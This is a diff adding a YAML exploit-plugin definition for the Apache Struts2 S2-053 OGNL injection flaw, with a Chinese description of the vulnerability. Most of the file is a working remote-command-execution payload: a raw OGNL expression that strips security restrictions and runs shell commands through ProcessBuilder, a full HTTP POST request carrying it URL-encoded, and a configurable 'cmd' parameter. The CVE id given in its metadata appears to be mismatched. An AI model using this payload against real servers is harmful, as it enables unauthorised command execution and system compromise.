@@ -1,0 +1,44 @@
+info:
+    app: Struts2
+    name: S2_053
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2017-09-01"
+    create_date: "2024-10-06 12:55:02"
+    update_date: "2024-10-06 12:55:02"
+    scope: Struts 2.0.1 - Struts 2.3.33, Struts 2.5 - Struts 2.5.10
+    description: |-
+        Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。
+        当开发者在Freemarker标签中使用如下代码时<@s.hidden name=”redirectUri” value=redirectUri /><@s.hidden name=”redirectUri” value=”${redirectUri}” />Freemarker会将值当做表达式进行执行，最后导致代码执行。
+    vul_id: CVE-2017-1000112
+    detail: |
+        该漏洞未合入工具，因需要找到输入点，输入点不固定，没有固定payload，这里只提供说明。
+        一般注入点为某个参数的值，将值替换成OGNL表达式即可，需要注意的是payload最后可能需要换行符才可执行成功\
+        并且要注意提交数据是否在界面会有回显点，否则无法看到执行结果。
+        %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
+    payload: |
+        POST /hello.action HTTP/1.1
+        Host: 192.168.111.111:8080
+        Content-Length: 991
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Origin: http://192.168.111.111:8080
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Referer: http://192.168.111.111:8080/hello.action
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=172B3BE5E5070CC47D9AC496699931E9
+        Connection: close
+
+        redirectUri=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27whoami%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0D%0A%0D%0A
+payloads:
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
